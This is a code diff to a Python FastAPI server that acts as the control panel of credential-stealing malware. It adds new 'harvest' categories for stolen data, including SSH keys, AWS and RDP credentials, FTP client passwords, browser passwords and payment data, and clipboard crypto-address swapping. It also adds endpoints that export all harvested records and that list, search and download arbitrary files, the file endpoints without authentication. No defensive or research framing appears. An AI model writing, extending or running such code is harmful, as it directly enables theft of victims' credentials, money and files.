@@ -700,7 +700,12 @@ async def websocket_endpoint(websocket: WebSocket):
                 sensitive_types = [
                     "browser_passwords", "get_browser_cookies", "get_wifi_passwords", 
                     "get_discord_tokens", "get_telegram", "scan_wallets", 
-                    "file_content", "keylog_dump", "location_info"
+                    "file_content", "keylog_dump", "location_info",
+                    "filezilla_creds", "winscp_creds", "ssh_keys", "aws_creds",
+                    "steam_data", "minecraft_data", "vpn_configs", "browser_payments",
+                    "email_creds", "mobaxterm_creds", "rdp_credentials", "product_keys",
+                    "clipboard_update", "crypto_swap", "window_change",
+                    "chrome_passwords", "firefox_passwords", "edge_passwords",
                 ]
                 if msg_type in sensitive_types:
                     state.save_harvest(client_id, msg_type, data)
@@ -733,14 +738,174 @@ async def broadcast_to_dashboards(data):
         except: to_remove.append(ws)
     for ws in to_remove: state.dashboards.discard(ws)
 
+async def send_heartbeat():
+    while True:
+        await asyncio.sleep(15)
+        for ws in list(state.dashboards):
+            try: await ws.send_json({"type": "heartbeat"})
+            except: pass
+
 def get_minimal_client_list():
     return [{
         "id": cid, 
         "name": c["info"].get("name", "Unknown"),
         "ip": c["info"].get("ip", "Unknown"),
-        "os": c["info"].get("os", "win"), # Default to win for icon
-        "status": "Online"
+        "os": c["info"].get("os", "win"),
+        "status": "Online",
+        "last_seen": datetime.now().isoformat(),
+        "tag": c["info"].get("tag", ""),
+        "is_active": 1
     } for cid, c in list(state.clients.items())]
+
+# ── New endpoints for enhanced functionality ──
+
+RATE_LIMIT_MAP = {}  # IP -> last request time
+
+@app.get("/export/harvest")
+async def export_harvest(token: str = None, format: str = "json"):
+    """Export all harvested data as JSON or CSV."""
+    if token != DASHBOARD_TOKEN:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    try:
+        conn = sqlite3.connect(state.db_path)
+        cur = conn.cursor()
+        cur.execute("SELECT * FROM harvested_records ORDER BY timestamp DESC")
+        cols = [c[0] for c in cur.description]
+        rows = [dict(zip(cols, row)) for row in cur.fetchall()]
+        conn.close()
+        if format == "csv":
+            csv_lines = [",".join(cols)]
+            for r in rows:
+                csv_lines.append(",".join([str(r.get(c, "")).replace(",", " ") for c in cols]))
+            return HTMLResponse(content="\n".join(csv_lines), media_type="text/csv")
+        return JSONResponse({"count": len(rows), "data": rows})
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, 500)
+
+@app.get("/export/devices")
+async def export_devices(token: str = None, format: str = "json"):
+    """Export device list."""
+    if token != DASHBOARD_TOKEN:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    try:
+        conn = sqlite3.connect(state.db_path)
+        cur = conn.cursor()
+        cur.execute("SELECT * FROM devices ORDER BY last_seen DESC")
+        cols = [c[0] for c in cur.description]
+        rows = [dict(zip(cols, row)) for row in cur.fetchall()]
+        conn.close()
+        return JSONResponse({"count": len(rows), "data": rows})
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, 500)
+
+@app.get("/manage/rate")
+async def rate_limiter_status(token: str = None):
+    """Check rate limiter status."""
+    if token != DASHBOARD_TOKEN:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    now = time.time()
+    active = {ip: round(now - last, 2) for ip, last in list(RATE_LIMIT_MAP.items())[:50]}
+    return {"active_ips": len(RATE_LIMIT_MAP), "recent": active}
+
+@app.post("/manage/cleanup")
+async def cleanup_old_data(token: str = None, days: int = 30, harvest: bool = True, events: bool = True):
+    """Auto-cleanup old records by age in days."""
+    if token != DASHBOARD_TOKEN:
+        return JSONResponse({"error": "Unauthorized"}, status_code=401)
+    try:
+        from datetime import timedelta
+        cutoff = (datetime.now() - timedelta(days=days)).isoformat()
+        conn = sqlite3.connect(state.db_path)
+        cur = conn.cursor()
+        total = 0
+        if harvest:
+            cur.execute("DELETE FROM harvested_records WHERE timestamp < ?", (cutoff,))
+            total += cur.rowcount
+        if events:
+            cur.execute("DELETE FROM events WHERE timestamp < ?", (cutoff,))
+            total += cur.rowcount
+        cur.execute("VACUUM")
+        conn.commit()
+        conn.close()
+        return {"status": "cleaned", "rows_removed": total, "days_threshold": days}
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, 500)
+
+# --- FILE MANAGER ENDPOINTS ---
+@app.get("/fm/list")
+async def fm_list(path: str = "C:\\"):
+    if not os.path.exists(path):
+        return JSONResponse({"error": "Path not found"}, 404)
+    try:
+        items = []
+        for name in os.listdir(path):
+            try:
+                full = os.path.join(path, name)
+                stat = os.stat(full)
+                items.append({
+                    "name": name, "path": full, "is_dir": os.path.isdir(full),
+                    "size": stat.st_size, "modified": stat.st_mtime
+                })
+            except:
+                items.append({"name": name, "path": os.path.join(path, name), "is_dir": os.path.isdir(os.path.join(path, name)), "size": 0, "modified": 0})
+        return {"path": path, "items": sorted(items, key=lambda x: (not x["is_dir"], x["name"].lower()))}
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, 500)
+
+@app.get("/fm/drive")
+async def fm_drives():
+    drives = []
+    for part in psutil.disk_partitions():
+        try:
+            usage = psutil.disk_usage(part.mountpoint)
+            drives.append({
+                "device": part.device, "mount": part.mountpoint, "fstype": part.fstype,
+                "total": usage.total, "used": usage.used, "free": usage.free, "percent": usage.percent
+            })
+        except:
+            drives.append({"device": part.device, "mount": part.mountpoint, "fstype": part.fstype})
+    return {"drives": drives}
+
+@app.get("/fm/search")
+async def fm_search(root: str = "C:\\", pattern: str = ""):
+    if not pattern:
+        return {"results": []}
+    matches = []
+    try:
+        for root_dir, dirs, files in os.walk(root):
+            for f in files:
+                if pattern.lower() in f.lower():
+                    full = os.path.join(root_dir, f)
+                    try:
+                        sz = os.path.getsize(full)
+                    except:
+                        sz = 0
+                    matches.append({"name": f, "path": full, "is_dir": False, "size": sz})
+            for d in dirs:
+                if pattern.lower() in d.lower():
+                    full = os.path.join(root_dir, d)
+                    matches.append({"name": d, "path": full, "is_dir": True, "size": 0})
+            if len(matches) > 200:
+                break
+    except:
+        pass
+    return {"query": pattern, "results": matches}
+
+@app.get("/fm/download")
+async def fm_download(path: str = ""):
+    if not path or not os.path.isfile(path):
+        return JSONResponse({"error": "File not found"}, 404)
+    try:
+        with open(path, "rb") as f:
+            content = f.read()
+        import base64
+        return {"name": os.path.basename(path), "content": base64.b64encode(content).decode("utf-8")}
+    except Exception as e:
+        return JSONResponse({"error": str(e)}, 500)
+
+@app.on_event("startup")
+async def startup():
+    asyncio.create_task(send_heartbeat())
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=PORT, ws_ping_interval=HEARTBEAT_INTERVAL, ws_ping_timeout=HEARTBEAT_TIMEOUT)
